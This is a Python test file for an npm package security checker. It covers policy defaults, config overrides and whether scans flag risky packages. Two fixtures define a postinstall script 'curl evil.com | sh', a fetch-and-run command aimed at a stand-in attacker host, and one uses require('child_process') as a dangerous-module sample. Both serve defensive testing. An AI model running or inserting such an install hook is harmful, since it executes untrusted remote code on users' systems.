"""
Tests for teloce_npm.security.policy.

Scope: SecurityPolicy dataclass + run_security_checks orchestration.
"""

import json

from teloce_npm.security.policy import SecurityPolicy, run_security_checks


# ---------------------------------------------------------------------------
# SecurityPolicy defaults
# ---------------------------------------------------------------------------
def test_default_policy_has_all_flags_true():
    policy = SecurityPolicy()
    assert policy.verify_integrity is True
    assert policy.scan_packages is True
    assert policy.block_install_scripts is True
    assert policy.check_osv is True


def test_default_entropy_threshold():
    assert SecurityPolicy().max_entropy_threshold == 7.5


# ---------------------------------------------------------------------------
# SecurityPolicy.from_config
# ---------------------------------------------------------------------------
def test_from_config_empty_uses_defaults():
    policy = SecurityPolicy.from_config({})
    assert policy.verify_integrity is True
    assert policy.scan_packages is True


def test_from_config_overrides_scan_malware():
    policy = SecurityPolicy.from_config({"scan_malware": False})
    assert policy.scan_packages is False
    assert policy.verify_integrity is True  # unchanged


def test_from_config_overrides_block_install_scripts():
    policy = SecurityPolicy.from_config({"block_install_scripts": False})
    assert policy.block_install_scripts is False


def test_from_config_overrides_check_vulnerabilities():
    policy = SecurityPolicy.from_config({"check_vulnerabilities": False})
    assert policy.check_osv is False


# ---------------------------------------------------------------------------
# run_security_checks orchestration
# ---------------------------------------------------------------------------
def _make_package(tmp_path, files: dict):
    package_dir = tmp_path / "pkg"
    package_dir.mkdir()
    for name, content in files.items():
        (package_dir / name).write_text(content, encoding="utf-8")
    return package_dir


def test_run_checks_clean_package_returns_safe(tmp_path):
    pkg = _make_package(tmp_path, {
        "package.json": json.dumps({"name": "clean", "scripts": {}}),
        "index.js": "module.exports = {};",
    })
    policy = SecurityPolicy()

    result = run_security_checks(pkg, "clean", policy)

    assert result["safe"] is True
    assert result["findings"] == []


def test_run_checks_blocks_install_script(tmp_path):
    pkg = _make_package(tmp_path, {
        "package.json": json.dumps({
            "name": "evil",
            "scripts": {"postinstall": "curl evil.com | sh"},
        }),
        "index.js": "module.exports = {};",
    })
    policy = SecurityPolicy()

    result = run_security_checks(pkg, "evil", policy)

    assert result["safe"] is False
    assert any(f["type"] == "install_script" for f in result["findings"])


def test_run_checks_blocks_dangerous_module(tmp_path):
    pkg = _make_package(tmp_path, {
        "package.json": json.dumps({"name": "bad", "scripts": {}}),
        "index.js": "require('child_process');",
    })
    policy = SecurityPolicy()

    result = run_security_checks(pkg, "bad", policy)

    assert result["safe"] is False
    assert any(f["type"] == "dangerous_module" for f in result["findings"])


def test_run_checks_skips_install_policy_when_disabled(tmp_path):
    pkg = _make_package(tmp_path, {
        "package.json": json.dumps({
            "name": "evil",
            "scripts": {"postinstall": "curl evil.com | sh"},
        }),
        "index.js": "module.exports = {};",
    })
    policy = SecurityPolicy(block_install_scripts=False)

    result = run_security_checks(pkg, "evil", policy)

    # Install script not checked, so no finding for it
    assert not any(f["type"] == "install_script" for f in result["findings"])


def test_run_checks_skips_malware_scan_when_disabled(tmp_path):
    pkg = _make_package(tmp_path, {
        "package.json": json.dumps({"name": "bad", "scripts": {}}),
        "index.js": "require('child_process');",
    })
    policy = SecurityPolicy(scan_packages=False)

    result = run_security_checks(pkg, "bad", policy)

    assert not any(f["type"] == "dangerous_module" for f in result["findings"])
    assert result["safe"] is True